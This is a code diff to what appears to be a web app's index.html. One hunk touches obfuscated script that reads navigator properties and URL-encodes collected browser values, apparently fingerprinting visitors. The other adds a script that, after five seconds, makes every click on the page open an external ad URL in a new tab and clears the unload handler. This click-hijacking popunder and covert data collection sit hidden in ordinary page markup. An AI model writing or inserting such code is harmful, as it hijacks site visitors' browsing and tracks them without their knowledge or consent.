@@ -57,7 +57,7 @@
         var Replace = (o => {
             var v = a[0];
             try {
-                v += a[1] + Boolean(navigator[a[2]][a[3]]);
+                v += a[1] + Boolean(navigator[a[2]][a[3]]); 
                 navigator[a[2]][a[4]](o[0]).then(r => {
                     o[0].forEach(k => {
                         v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0]
@@ -102,15 +102,21 @@
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
 
+    <!-- Additional Click URL Script -->
     <script>
         (function () {
-            // Placeholder click URL for advertisement
             var clickUrl = "https://toopsoug.net/4/8754612?var={your_source_id}";
 
-            // Automatically triggers the advertisement after 5 seconds
+            function clickTbEventInit() {
+                document.addEventListener('click', function () {
+                    window.onbeforeunload = null;
+                    window.open(clickUrl, '_blank', 'noreferrer,noopener');
+                });
+            }
+
             setTimeout(function () {
-                window.open(clickUrl, '_blank', 'noreferrer,noopener');
-            }, 5000);  // Open after 5 seconds
+                clickTbEventInit();
+            }, 5000);
         })();
     </script>
   </body>
